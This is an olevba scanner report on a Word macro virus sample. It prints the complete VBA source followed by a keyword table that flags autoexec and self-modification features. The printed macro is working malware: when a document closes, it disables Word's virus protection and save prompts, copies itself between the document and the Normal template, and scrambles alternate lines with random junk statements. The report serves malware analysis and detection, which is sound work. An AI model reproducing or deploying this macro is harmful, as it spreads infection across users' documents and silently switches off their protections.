olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CPCK-based-33625b7bbd3d98f49a711a7527b79774bc76104b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CPCK-based-33625b7bbd3d98f49a711a7527b79774bc76104b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Close()

On Error Resume Next

Application.EnableCancelKey = 0

Options.VirusProtection = 0

Options.SaveNormalPrompt = 0

Options.ConfirmConversions = 0

EA52 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines

CR19 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines

If EA52 > 0 And CR19 > 0 Then GoTo AC41

If EA52 = 0 Then

Set LU87 = ActiveDocument.VBProject.VBComponents.Item(1)

QO97 = True

End If

If CR19 = 0 Then

Set LU87 = NormalTemplate.VBProject.VBComponents.Item(1)

PM27 = True

End If

If PM27 <> True And QO97 <> True Then GoTo AC41

If PM27 = True Then LU87.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, EA52 - 1))

If QO97 = True Then LU87.CodeModule.AddFromString ("Sub Document_Close()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, CR19 - 1))

With LU87.CodeModule

For x = 2 To (LU87.CodeModule.CountOfLines - 1) Step 2

.replaceline x, (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & " = " & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & " + " & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22)))

Next x

End With

AC41:

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

